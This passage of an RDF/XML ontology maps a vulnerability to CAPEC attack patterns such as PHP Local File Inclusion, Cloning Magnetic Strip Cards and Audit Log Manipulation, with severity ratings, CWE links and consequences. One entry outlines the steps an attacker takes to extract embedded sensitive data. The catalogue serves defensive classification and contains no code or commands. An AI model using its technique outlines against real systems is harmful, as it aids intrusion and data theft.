                          <j.0:Name rdf:about="http://krstProj.com/capec#Explore for Predictable Temporary File Names"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack250">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#402">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:401::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Bypassing ATA Password Security"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::285::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack240">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#397">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:395::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Cloning Magnetic Strip Cards"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack483">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#327">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP Options Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack444">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#252">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:251::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#PHP Local File Inclusion"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::829::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack197">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#601">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:607::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Jamming"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other The jamming of equipment denies the availability of functioning communications services.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack359">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#539">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:444::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ASIC With Malicious Functionality"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack279">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#533">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:186::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Manual Software Update"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::494::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack317">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#530">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:531::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Provide Counterfeit Component"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack58">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#192">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Protocol Analysis"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::326::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Successful deciphering of protocol information compromises the confidentiality of future sensitive communications.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data Modifying communications after successful deciphering of protocol information compromises integrity.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack262">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#183">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:248::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#IMAP/SMTP Command Injection"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::77::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack488">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#322">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP (ISN) Greatest Common Divisor Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack482">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#317">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#IP ID Sequencing Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack351">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#517">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:447::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Documentation Alteration to Circumvent Dial-down"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <rdf:type rdf:resource="http://krstProj.com/capec#Vulnerability"/>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack295">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#386">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:94::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Application API Navigation Remapping"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack339">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#392">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:391::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Lock Bumping"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack374">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#390">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Bypassing Physical Security"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack281">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#179">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:554::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Calling Micro-Services Directly"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack245">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#37">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:167::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Retrieve Embedded Sensitive Data"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::311::525::312::314::315::318::"/>
                    </j.0:exploits>
                    <j.0:executes>
                      <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify Target) Attacker identifies client components to extract information from. These may be binary executables  class files  shared libraries (e.g.  DLLs)  configuration files  or other system files.TECHNIQUE:Binary file extraction. The attacker extracts binary files from zips  jars  wars  PDFs or other composite formats.:TECHNIQUE:Package listing. The attacker uses a package manifest provided with the software installer  or the filesystem itself  to identify component files suitable for attack.::STEP:2:PHASE:Experiment:DESCRIPTION:(Apply mining techniques) The attacker then uses a variety of techniques  such as sniffing  reverse-engineering  and cryptanalysis to extract the information of interest.TECHNIQUE:API Profiling. The attacker monitors the software&apos;s use of registry keys or other operating system-provided storage locations that can contain sensitive information.:TECHNIQUE:Execution in simulator. The attacker physically removes mass storage from the system and explores it using a simulator  external system  or other debugging harness.:TECHNIQUE:Common decoding methods. The attacker applies methods to decode such encodings and compressions as Base64  unzip  unrar  RLE decoding  gzip decompression and so on.:TECHNIQUE:Common data typing. The attacker looks for common file signatures for well-known file types (JPEG  TIFF  ASN.1  LDIF  etc.). If the signatures match  he attempts decoding in that format.::"/>
                    </j.0:executes>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack443">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#268">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:161::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Audit Log Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::117::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack179">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#220">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:272::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Client-Server Protocol Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::757::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack124">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#122">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Privilege Abuse"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::732::269::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack85">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#479">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:473::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Root Certificate"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack396">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#559">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:601::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Orbital Jamming"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other A successful attack will deny the availability of the satellite communications for authorized users.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack91">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#440">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Hardware Integrity Attack"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack267">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#234">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:233::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Hijacking a privileged process"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
